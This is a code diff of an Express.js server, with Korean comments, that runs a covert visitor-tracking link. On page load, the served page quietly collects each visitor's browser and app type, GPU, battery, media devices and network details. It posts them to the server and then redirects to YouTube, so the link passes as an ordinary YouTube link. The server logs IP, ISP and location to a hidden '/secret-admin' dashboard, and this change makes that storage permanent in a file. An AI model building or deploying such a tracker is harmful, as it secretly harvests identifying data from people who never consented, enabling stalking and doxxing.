@@ -1,11 +1,36 @@
 const express = require('express');
+const fs = require('fs');
+const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-let collectedLogs = [];
+// [파일 저장 경로 설정]
+const DATA_FILE = path.join(__dirname, 'data.json');
+
+// 기존 파일 데이터 불러오기 함수
+function loadLogs() {
+  try {
+    if (fs.existsSync(DATA_FILE)) {
+      const fileData = fs.readFileSync(DATA_FILE, 'utf8');
+      return JSON.parse(fileData);
+    }
+  } catch (e) {
+    console.error('파일 로드 실패:', e);
+  }
+  return [];
+}
+
+// 파일에 데이터 저장하기 함수
+function saveLogs(logs) {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(logs, null, 2), 'utf8');
+  } catch (e) {
+    console.error('파일 저장 실패:', e);
+  }
+}
 
 // [1] 메인 수집 및 리디렉션 페이지
 app.get('/', (req, res) => {
@@ -56,7 +81,6 @@ app.get('/', (req, res) => {
           const fps = await getFPS();
           const ua = navigator.userAgent;
 
-          // 접속 앱 유형
           let appType = '일반 브라우저';
           if (ua.includes('KAKAOTALK')) appType = '카카오톡';
           else if (ua.includes('Instagram')) appType = '인스타그램';
@@ -64,7 +88,6 @@ app.get('/', (req, res) => {
           else if (ua.includes('FB_IAB') || ua.includes('FB4A')) appType = '페이스북';
           else if (ua.includes('Line')) appType = '라인';
 
-          // 미디어 장치 수 측정
           let mediaDevicesInfo = 'N/A';
           try {
             if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
@@ -75,12 +98,10 @@ app.get('/', (req, res) => {
             }
           } catch(e) {}
 
-          // 입력 장치 구분
           let pointerType = '기본 마우스/터치';
           if (matchMedia('(pointer: coarse)').matches) pointerType = '터치스크린 (손가락)';
           else if (matchMedia('(pointer: fine)').matches) pointerType = '정밀 마우스/트랙패드';
 
-          // 백엔드로 보낼 세부 데이터 개별 분리
           const data = {
             timestamp: new Date().toLocaleString('ko-KR'),
             clientTime: new Date().toString(),
@@ -113,14 +134,12 @@ app.get('/', (req, res) => {
             referrer: document.referrer || '직접 접속 / 외부 링크'
           };
 
-          // 네트워크
           if (navigator.connection) {
             data.connectionType = navigator.connection.effectiveType || 'N/A';
             data.downlink = navigator.connection.downlink ? \`\${navigator.connection.downlink} Mbps\` : 'N/A';
             data.rtt = navigator.connection.rtt ? \`\${navigator.connection.rtt} ms\` : 'N/A';
           }
 
-          // GPU (WebGL)
           try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -130,7 +149,6 @@ app.get('/', (req, res) => {
             }
           } catch(e) {}
 
-          // 배터리 (안드로이드/PC 지원 시)
           try {
             if (navigator.getBattery) {
               const battery = await navigator.getBattery();
@@ -138,7 +156,6 @@ app.get('/', (req, res) => {
             }
           } catch(e) {}
 
-          // 수집 데이터 전송
           try {
             await fetch('/collect', {
               method: 'POST',
@@ -147,7 +164,6 @@ app.get('/', (req, res) => {
             });
           } catch (e) {}
 
-          // 이동할 유튜브 링크
           window.location.href = 'https://www.youtube.com';
         }
 
@@ -158,7 +174,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// [2] IP 및 데이터 저장 API
+// [2] IP 및 파일 저장 API
 app.post('/collect', async (req, res) => {
   let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
   if (ip.includes(',')) ip = ip.split(',')[0].trim();
@@ -177,21 +193,25 @@ app.post('/collect', async (req, res) => {
     }
   } catch (e) {}
 
+  const logs = loadLogs();
   const fullLog = {
-    id: collectedLogs.length + 1,
+    id: logs.length + 1,
     ip: ip,
     isp: isp,
     netType: netType,
     location: location,
     ...req.body
   };
-  collectedLogs.unshift(fullLog);
+  
+  logs.unshift(fullLog);
+  saveLogs(logs); // 파일로 저장
   res.status(200).json({ status: 'ok' });
 });
 
 // [3] 분리된 수집 항목 대시보드 (/secret-admin)
 app.get('/secret-admin', (req, res) => {
-  let rows = collectedLogs.map(log => `
+  const logs = loadLogs();
+  let rows = logs.map(log => `
     <tr>
       <td>${log.id}</td>
       <td><strong>${log.timestamp}</strong></td>
@@ -236,7 +256,7 @@ app.get('/secret-admin', (req, res) => {
       </style>
     </head>
     <body>
-      <h1>📊 항목별 수집 데이터 목록 (총 ${collectedLogs.length}건)</h1>
+      <h1>📊 항목별 영구 저장 데이터 목록 (총 ${logs.length}건)</h1>
       <button onclick="location.reload()">🔄 대시보드 새로고침</button>
       <div class="table-container">
         <table>
@@ -268,7 +288,6 @@ app.get('/secret-admin', (req, res) => {
           <tbody>
             ${rows || '<tr><td colspan="21" style="text-align:center;">수집된 데이터가 없습니다.</td></tr>'}
           </tbody>
-        </tbody>
         </table>
       </div>
     </body>
